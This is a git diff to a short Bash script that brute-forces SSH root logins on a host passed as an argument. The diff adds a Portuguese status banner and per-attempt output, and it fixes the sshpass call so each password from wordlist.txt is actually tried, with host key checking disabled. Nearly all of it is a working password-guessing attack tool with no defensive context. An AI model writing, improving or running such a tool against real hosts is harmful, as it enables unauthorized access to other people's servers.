@@ -17,8 +17,13 @@ else
 	echo "######## Developed by: N0KK ####"
 	echo "################################"
 
+	echo""
+	echo "Iniciando o brutforce SSH no Host: $1"
+	echo""
+
 for brute in $(cat wordlist.txt)
 do
-	sshpass -p 'brute' ssh -o StrictHostKeyChecking=no root@$1
-done
+	echo "Trying password: $brute"
+	sshpass -p $brute ssh -o StrictHostKeyChecking=no root@$1
+done < wordlist.txt
 fi
